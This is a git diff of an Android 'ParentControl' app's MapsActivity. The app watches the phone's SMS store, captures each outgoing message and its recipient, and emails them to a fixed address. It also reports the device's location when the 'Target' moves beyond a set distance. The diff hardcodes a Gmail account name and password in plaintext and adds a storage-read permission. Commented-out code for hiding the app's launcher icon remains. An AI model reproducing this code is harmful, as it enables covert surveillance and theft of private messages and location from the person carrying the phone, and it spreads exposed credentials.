@@ -70,13 +70,15 @@ public class MapsActivity extends AppCompatActivity {
 
     private Button alertButton;
     private TextView alertTextView;
-    int k=0;
-    ArrayList<Integer>  list = new ArrayList<Integer>();
+    ArrayList<Integer> list = new ArrayList<Integer>();
 
     String phoneNo;
     String message;
+    
+    String EMAIL = "alocationapp@gmail.com";
+    String password = "location21";
 
-    //Button   mButton;
+    //Button mButton;
     //EditText mEdit;
     String temp;
 
@@ -86,75 +88,13 @@ public class MapsActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_maps);
 
-
-
-        File path = getApplicationContext().getFilesDir();
-        File file = new File(path, "my-file-name.txt");
-
-        final Button mButton = findViewById(R.id.button_id);
-
-
-        final EditText mEdit   = findViewById(R.id.editText);
-
-        if(!file.exists()) {
-
-
-
-
-
-            mButton.setOnClickListener(
-                    new View.OnClickListener() {
-                        public void onClick(View view) {
-                            mEdit.setVisibility(View.INVISIBLE);
-                            mButton.setVisibility(View.INVISIBLE);
-
-
-                            FileOutputStream stream = null;
-                            try {
-                                stream = new FileOutputStream(file);
-                            } catch (FileNotFoundException e) {
-                                e.printStackTrace();
-                            }
-                            try{
-
-
-                                stream.write(mEdit.getText().toString().getBytes());
-                            }catch(Exception ex){}
-                            finally {
-                                try {
-                                    stream.close();
-                                } catch (IOException e) {
-                                    e.printStackTrace();
-                                }
-                            }
-                            int length = (int) file.length();
-
-                            byte[] bytes = new byte[length];
-
-                            try {
-                                FileInputStream in = new FileInputStream(file);
-                                in.read(bytes);
-                            } catch (IOException e) {
-                                e.printStackTrace();
-                            }
-
-                            String temp = new String(bytes);
-                            System.out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+temp);
-
-                        }
-                    });
-        }
-        else{
-            mEdit.setVisibility(View.INVISIBLE);
-            mButton.setVisibility(View.INVISIBLE);
-            System.out.println("poopie");
-        }
         //     PackageManager p = getPackageManager();
         //      ComponentName componentName = new ComponentName(this, MapsActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
         //     p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 
         Context context = getApplicationContext();
         client = LocationServices.getFusedLocationProviderClient(this);
+
 
         //Check permission
         if (ActivityCompat.checkSelfPermission(MapsActivity.this,
@@ -170,7 +110,6 @@ public class MapsActivity extends AppCompatActivity {
                     new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 44);
         }
 
-
         //startService(new Intent(MapsActivity.this,MyService.class));
 
         //Assign variable
@@ -183,7 +122,6 @@ public class MapsActivity extends AppCompatActivity {
         contentResolver.registerContentObserver(Uri.parse("content://sms"), true, new smsObserver(new Handler(),this));
 
     }
-
 
     private static final String COLUMN_TYPE = "type";
     private static final int MESSAGE_TYPE_SENT = 2;
@@ -216,8 +154,6 @@ public class MapsActivity extends AppCompatActivity {
                 //when permission granted
                 //call method
 
-
-
             if (ContextCompat.checkSelfPermission(mContext,
                     Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                 try {
@@ -239,7 +175,8 @@ public class MapsActivity extends AppCompatActivity {
                             if (!address.equals("123456789")) {
 
                                 String line = "Message: " + message + " to: " + address;
-                                sender = new Mail("pavlos.repin@gmail.com", "");
+
+                                sender = new Mail(EMAIL, password);
                                 StringMake.setString(line);
                                 StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.
                                         Builder().permitAll().build();
@@ -259,7 +196,7 @@ public class MapsActivity extends AppCompatActivity {
                       //When permission denied
                     //Request permission
                     ActivityCompat.requestPermissions(MapsActivity.this,
-                            new String[]{Manifest.permission.READ_SMS,Manifest.permission.READ_CALL_LOG,Manifest.permission.READ_PHONE_STATE}, 44);
+                            new String[]{Manifest.permission.READ_SMS,Manifest.permission.READ_CALL_LOG,Manifest.permission.READ_PHONE_STATE,Manifest.permission.READ_EXTERNAL_STORAGE}, 44);
 
 
                 }
@@ -341,7 +278,6 @@ public class MapsActivity extends AppCompatActivity {
                                 double lat = location.getLatitude();
                                 double lng = location.getLongitude();
 
-
                                 sendSMSMessage(lat, lng);
 
                             }
@@ -360,6 +296,7 @@ public class MapsActivity extends AppCompatActivity {
                         protected synchronized void buildGoogleApiClient() {
 
                             mGoogleApiClient.connect();
+
                         }
 
                     });
@@ -373,7 +310,8 @@ public class MapsActivity extends AppCompatActivity {
 
         phoneNo = "123456789";
         message = "Message from ParentControl app:" + "\n" + "\n" + "Target has strayed further from the maximum allowed distance\n" + "Latitude: " + lat + "\n" + "Longitude: " + lng;
-        sender = new Mail("pavlos.repin@gmail.com", "");
+
+        sender = new Mail(EMAIL, password);
         StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.
                 Builder().permitAll().build();
         StrictMode.setThreadPolicy(policy);
@@ -418,7 +356,7 @@ public class MapsActivity extends AppCompatActivity {
             try {
 
                 // Add subject, Body, your mail Id, and receiver mail Id.
-                sender.sendMail("Warning from parent control", "ooooooooooof", "pavlos.repin@gmail.com", "cse242017051@uniwa.gr");
+                sender.sendMail("Warning from parent control", "ooooooooooof", EMAIL, "cse242017051@uniwa.gr");
 
             } catch (Exception ex) {
 
@@ -456,7 +394,7 @@ public class MapsActivity extends AppCompatActivity {
                 // Add subject, Body, your mail Id, and receiver mail Id.
                 String line = null;
                 line = StringMake.getString();
-                sender.sendMail("Warning from parent control", line, "pavlos.repin@gmail.com", "cse242017051@uniwa.gr");
+                sender.sendMail("Warning from parent control", line, EMAIL, "cse242017051@uniwa.gr");
 
             } catch (Exception ex) {
 
@@ -546,4 +484,5 @@ public class MapsActivity extends AppCompatActivity {
         }
 
     }
+
 }
